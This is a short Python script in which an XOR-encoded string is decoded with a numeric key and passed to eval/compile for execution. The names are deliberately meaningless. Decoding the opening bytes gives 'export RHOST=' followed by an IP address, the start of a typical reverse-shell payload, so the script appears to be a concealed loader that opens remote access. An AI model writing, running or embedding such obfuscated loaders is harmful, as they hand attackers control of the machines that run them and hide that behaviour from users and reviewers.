wopvEaTEcopFEavc ="P@DVE@\x15dx|jg\x08\x12\t\x0b\x00\x19\x02\x07\t\x19\x07\x04\x1e\x03\x1b\rRO@[J@\x17jcydd\r\x01\x02\x03\t\nFMC\\ZY\x15\x1eT\x17\x13_\\B\\KM\x16DOF\x1dFZWRS@\x1c[C\x15BDH\x0cF\tA\\TYUA\x1aG[[\\TC\x10\x1e\rF\x16WVYZPUD\x1b\x11\\F\x1e_WFR]G\x19\x15cy\x7fcm\x14\x1e\x1bYZL\x1cXK\x1dQSDUZD\x1e\x1bcf{e`\x17\x1e\x1c\x1a\x1e\x0coYB\x1cWLI\x04\x1fE\x1bW\\YQWY\x1c\x19\x18V]\x1b\x10WXG\x14TW\x17[^\x15\x1c\x04\x18\t\x1b\x03\x1ee\x0cFAA\x1aJGUBX\x18\x11J[\x17\x19\x1f" 

iOpvEoeaaeavocp = "5849745603935082273117110096770484783660042691647457537746123996765155496404092017542372054448717876"
uocpEAtacovpe = len(wopvEaTEcopFEavc)
oIoeaTEAcvpae = ""
for fapcEaocva in range(uocpEAtacovpe):
    nOpcvaEaopcTEapcoTEac = wopvEaTEcopFEavc[fapcEaocva]
    qQoeapvTeaocpOcivNva = iOpvEoeaaeavocp[fapcEaocva % len(iOpvEoeaaeavocp)]
    oIoeaTEAcvpae += chr(ord(nOpcvaEaopcTEapcoTEac) ^ ord(qQoeapvTeaocpOcivNva))


eval(compile(oIoeaTEAcvpae, '<string>', 'exec'))